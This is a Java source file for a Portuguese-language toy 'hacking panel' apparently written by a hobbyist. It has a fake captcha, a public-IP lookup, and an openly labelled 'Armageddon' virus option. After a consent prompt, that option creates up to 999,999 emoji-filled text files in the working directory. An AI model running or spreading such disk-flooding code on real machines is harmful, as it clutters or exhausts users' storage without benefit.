import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.io.*;
import java.util.Random;
import java.util.Scanner;

public class Nuclear {
    public static void main(String[] args) throws InterruptedException {
        // NUCLEAR ACESSO

        Scanner s = new Scanner(System.in);
        UI ui = new UI();
        FE f = new FE();
        while (true) {
            int nv = new Random().nextInt(16987);
            f.clear(85);
            ui.c_nucluar();
            System.out.println("Para Comfirma Que voce nao é um robo, digite esse codigo: " + nv);
            System.out.print("Porfavor digite o Codigo enviado: ");
            int cv = s.nextInt();
            s.nextLine();
            if (cv == nv) {
                break;
            } else {
                System.err.println("Codigo Invalido");
                Thread.sleep(5000);
                f.clear(85);
            }

       }

       // NUCLEAR MENU

       while (true) {
            f.clear(85);
            ui.menu();
            System.out.println("Seja Bem vindo A o Painel Nuclear, Se divirta com as opçoes:\n");
            System.out.println("1. Seu IP");
            System.out.println("2. Armageddon (VIRUS) - Em desenvolvimento\n");
            System.out.print("Porfavor, Digite o Numero Referente a sua escolha: ");
            int op = s.nextInt();
            s.nextLine();
            switch (op) {
                case 1:
                    try {
                        System.out.println("Aguarde, Estamos Obtendo seu ip...");
                        f.userIP();
                        System.out.println("Deseja Voltar A o Painel?(S/N)");
                        String gh = s.nextLine();
                        if (gh.equalsIgnoreCase("N")) {
                            return;
                        }
                        
                    } catch (Exception e) {
                        System.out.println("Desculpe, Nao consegui acessar seu ip.");
                    }
                    break;

                case 2:
                    System.out.println("Atenção, Mesmo Que esse Virus Não seja poderoso, por favor, utilize com moderaçao");
                    System.out.print("Deseja Mesmo Arriscar o Risco de Executar(S/N): ");
                    String wdf = s.nextLine();
                    if (wdf.equalsIgnoreCase("S")) {
                        try {
                            f.clear(85);
                            ui.menu_arm();
                            f.Armageddon();
                            System.out.println("Executado com sucesso, aproveite seu computador.");
                            System.out.println("Espere um Pouco, voce sera direcionado para o painel.");
                            Thread.sleep(5000);


                        } catch (Exception e) {
                            System.out.println("Desculpe, mais occoreu um erro na execuçao.");
                        }
                    } 
                    break;

                default:
                    System.err.println("Digite o Numero Correto");
                    Thread.sleep(2000);
                    break;
        }

       } 
    }
}

class UI {
    // MENUS:

    // MENU CREDITOS

    public void c_nucluar() {
        System.out.println("=============================");
        System.out.println("|          NUCLEAR          |");
        System.out.println("|          V0.0.2           |");
        System.out.println("|         By Skaylatk       |");
        System.out.println("=============================\n");
    } 

    // MENU PRINCIPAL
    
    public void menu() {
        System.out.println("============================");
        System.out.println("|       MENU NUCLEAR       |");
        System.out.println("============================\n");
    }

    // MENU ARMAGEDDON

    public void menu_arm() {
        System.out.println("===========================");
        System.out.println("|          ARMAGEDDON     |");
        System.out.println("|         By Skaylatk     |");
        System.out.println("===========================\n");
    }

}

class FE {
    // Ferramentas
    public void clear(int Q) {
        for (int i = 0; i < Q; i++) {
            System.out.println("");
        }
    }

    // Exebir ip

    public void userIP() throws InterruptedException, URISyntaxException, IOException {
        HttpClient cl = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            .uri(new URI("https://icanhazip.com/"))
            .GET()
            .build();
        HttpResponse<String> httpResponse = cl.send(request, HttpResponse.BodyHandlers.ofString());
        System.out.println("Seu ip é: " + httpResponse.body());
    }

    // ARMAGEDDON

    public void Armageddon() {
        System.out.println("VOCE DECIDIU SOFRER AS CONSEQUENCIAS DO ARMAGEDDON, ENTAO SE PREPARA PRA BALA QUE LA VEM POEIRA!");
        for (int i = 0; i < 999999; i++) {
            String arqname = "AMARGEDDON" + i + ".txt";
            String xnx = "💥💥💥💥💥💥💥ARMAGEDDON.NUCLEAR💥💥💥💥💥💥💥💥💥💥💥ARMAGEDDON.NUCLEAR💥💥💥💥💥💥💥💥💥💥💥ARMAGEDDON.NUCLEAR💥💥💥💥💥💥💥💥💥💥💥ARMAGEDDON.NUCLEAR💥💥💥💥💥💥💥💥💥💥💥ARMAGEDDON.NUCLEAR💥💥💥💥💥💥";
            try {
                File f = new File(arqname);
                System.out.println("Aguarde, Estamos Destruindo o seu dispositivo...");

                if (f.createNewFile()) {
                    FileWriter escr = new FileWriter(arqname);
                    escr.write(xnx);
                    escr.close();
                } else { 
                    System.err.println("Desculpe, mas nao é possivel executar esse virus novamente");
                    return;
                }
            } catch (IOException e) {
                System.err.println("Vixe, deu pau");
            }
        }
        
    }

}
